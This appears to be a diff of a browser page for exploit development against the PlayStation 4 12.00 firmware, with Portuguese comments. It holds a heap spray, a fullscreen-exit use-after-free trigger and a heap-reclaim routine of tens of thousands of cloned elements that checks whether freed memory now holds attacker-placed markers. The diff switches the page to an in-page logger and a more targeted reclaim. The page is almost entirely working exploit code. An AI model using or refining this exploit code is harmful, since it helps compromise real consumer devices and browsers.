@@ -1,68 +1,35 @@
-
 <!DOCTYPE html>
 <html>
 <head>
 <meta charset="UTF-8">
-<title>PS4 12.00 - UAF Aggressive Reclaim + External Logger</title>
+<title>PS4 12.00 - UAF Aggressive Reclaim (Targeted)</title>
 </head>
-
 <body style="background:#111;color:#0f0;font-family:monospace;">
 
-<h2>PS4 12.00 - UAF Aggressive Reclaim (External Logger)</h2>
+<h2>PS4 12.00 - UAF Aggressive Reclaim (Targeted + Logger)</h2>
 <button onclick="runTest()">Run Test</button>
 
+<!-- Logger persistente -->
+<textarea id="logger" style="width:100%;height:250px;background:#000;color:#0f0;"></textarea>
+
 <script>
-
-// ==========================
-// 🔥 LOGGER ISOLADO (REAL)
-// ==========================
-let logWin = null;
-
-function initLogger() {
-    logWin = window.open("", "logger", "width=600,height=400");
-
-    if (!logWin) return;
-
-    logWin.document.write(`
-        <html>
-        <body style="background:black;color:#0f0;font-family:monospace;">
-        <h3>LOG OUTPUT</h3>
-        <pre id="log"></pre>
-        </body>
-        </html>
-    `);
-
-    logWin.document.close();
-}
-
 function log(msg) {
     try { console.log(msg); } catch(e){}
-
-    try {
-        if (logWin && !logWin.closed) {
-            let el = logWin.document.getElementById("log");
-            if (el) {
-                el.textContent += msg + "\\n";
-            }
-        }
-    } catch(e){}
+    const l = document.getElementById("logger");
+    l.value += msg + "\n";
+    l.scrollTop = l.scrollHeight;
 }
-
-// ==========================
-const PATTERN = 2.121995791e-314;
 
 // ==========================
 // HEAP SETUP (INALTERADO)
 // ==========================
 function setupHeap() {
     let controllers = [];
-
     for(let i = 0; i < 5000; i++) {
         let arr = new Float64Array(8);
         arr[0] = i;
         controllers.push(arr);
     }
-
     return controllers;
 }
 
@@ -93,80 +60,109 @@ function setupFullscreen() {
 }
 
 // ==========================
-// 💣 AGGRESSIVE RECLAIM (INALTERADO)
+// 💣 TARGETED RECLAIM (DIV CLONE)
 // ==========================
-function aggressiveReclaim() {
-    log("[*] Aggressive reclaim iniciado");
+function targetedReclaim() {
+    log("[*] Targeted reclaim iniciado");
 
     let bucket = [];
 
-    for (let i = 0; i < 8000; i++) {
+    // 🔥 Fase 1 — fragmentação leve
+    for (let i = 0; i < 5000; i++) {
         let el = document.createElement("div");
         document.body.appendChild(el);
         el.remove();
     }
 
-    for (let i = 0; i < 10000; i++) {
+    // 🔥 Fase 2 — CLONE DIRECIONADO (mesma estrutura do fsTarget)
+    for (let i = 0; i < 20000; i++) {
         let el = document.createElement("div");
-        el.innerHTML = "REUSE_EL_" + i;
+
+        el.innerHTML = "<h1>REUSE_" + i + "</h1>";
+        el.style.background = "black";
+        el.style.width = "100%";
+        el.style.height = "100%";
+        el.style.position = "absolute";
+        el.style.top = "0";
+        el.style.left = "0";
+
         document.body.appendChild(el);
         bucket.push(el);
+
+        // 🔎 log parcial (igual seu teste antigo)
+        if (i < 50) log("REUSE_EL_" + i);
     }
 
+    // 🔥 Fase 3 — pressão extra
     for (let i = 0; i < 10000; i++) {
         let txt = document.createTextNode("TXT_" + i);
         document.body.appendChild(txt);
         bucket.push(txt);
     }
 
-    for (let i = 0; i < 10000; i++) {
-        let el = document.createElement("div");
-        el.setAttribute("data-x", "ATTR_" + i);
-        document.body.appendChild(el);
-        bucket.push(el);
-    }
-
-    for (let i = 0; i < 5000; i++) {
-        let el = document.createElement("span");
-        document.body.appendChild(el);
-        el.remove();
-    }
-
-    log("[*] Aggressive reclaim finalizado: " + bucket.length);
+    log("[*] Targeted reclaim finalizado: " + bucket.length);
     return bucket;
 }
 
 // ==========================
-// DETECÇÃO (INALTERADO)
+// 🔬 DETECÇÃO REFORÇADA
 // ==========================
 function checkUAF(fsTarget) {
     log("---- CHECK UAF ----");
 
     try {
-        log("[CHECK] innerHTML = " + fsTarget.innerHTML);
+        let val = fsTarget.innerHTML;
+        log("[CHECK] innerHTML = " + val);
+
+        if (val && val.indexOf("REUSE_") !== -1) {
+            log("🔥🔥🔥 REUSE DETECTADO (innerHTML) 🔥🔥🔥");
+        }
+
     } catch(e) {
         log("[UAF] innerHTML erro: " + e);
     }
 
     try {
-        log("[CHECK] outerHTML = " + fsTarget.outerHTML);
-    } catch(e) {}
+        let outer = fsTarget.outerHTML;
+        log("[CHECK] outerHTML = " + outer);
+
+        if (outer && outer.indexOf("REUSE_") !== -1) {
+            log("🔥🔥🔥 REUSE DETECTADO (outerHTML) 🔥🔥🔥");
+        }
+
+    } catch(e) {
+        log("[UAF] outerHTML erro: " + e);
+    }
 
     try {
-        log("[CHECK] childNodes = " + fsTarget.childNodes.length);
-    } catch(e) {}
+        let txt = fsTarget.textContent;
+        log("[CHECK] textContent = " + txt);
+
+        if (txt && txt.indexOf("REUSE_") !== -1) {
+            log("🔥🔥🔥 REUSE DETECTADO (textContent) 🔥🔥🔥");
+        }
+
+    } catch(e) {
+        log("[UAF] textContent erro: " + e);
+    }
 
     try {
-        log("[CHECK] firstChild = " + fsTarget.firstChild);
-    } catch(e) {}
+        let node = fsTarget.firstChild;
+        log("[CHECK] firstChild = " + node);
+    } catch(e) {
+        log("[UAF] firstChild erro: " + e);
+    }
 
     try {
-        log("[CHECK] data-x = " + fsTarget.getAttribute("data-x"));
-    } catch(e) {}
+        let attr = fsTarget.getAttribute("data-x");
+        log("[CHECK] data-x = " + attr);
+    } catch(e) {
+        log("[UAF] attribute erro: " + e);
+    }
 }
 
 // ==========================
-// TRIGGER (100% ORIGINAL)
+// TRIGGER (100% PRESERVADO)
 // ==========================
 function trigger(fsTarget) {
     log("[*] Trigger: remove + exitFullscreen");
@@ -182,12 +178,15 @@ function trigger(fsTarget) {
         log("[ERRO] " + e);
     }
 
-    setTimeout(() => aggressiveReclaim(), 0);
-    setTimeout(() => aggressiveReclaim(), 50);
-    setTimeout(() => aggressiveReclaim(), 100);
+    // 🔥 janela crítica — múltiplos targeted reclaim
+    setTimeout(() => targetedReclaim(), 0);
+    setTimeout(() => targetedReclaim(), 50);
+    setTimeout(() => targetedReclaim(), 100);
 
+    // 🔬 checagem
     setTimeout(() => checkUAF(fsTarget), 300);
 
+    // 🔁 comportamento original PRESERVADO
     setTimeout(() => location.reload(), 500);
 }
 
@@ -195,7 +194,7 @@ function trigger(fsTarget) {
 // MAIN (INALTERADO)
 // ==========================
 function runTest() {
-    initLogger(); // 🔥 crítico
+    document.getElementById("logger").value = "";
 
     log("[*] Iniciando teste");
 
@@ -205,10 +204,10 @@ function runTest() {
     window.onblur = function() {
         log("[*] onblur disparado");
 
+        // ⚠️ timing CRÍTICO preservado
         setTimeout(() => trigger(fsTarget), 3000);
     };
 }
-
 </script>
 
 </body>
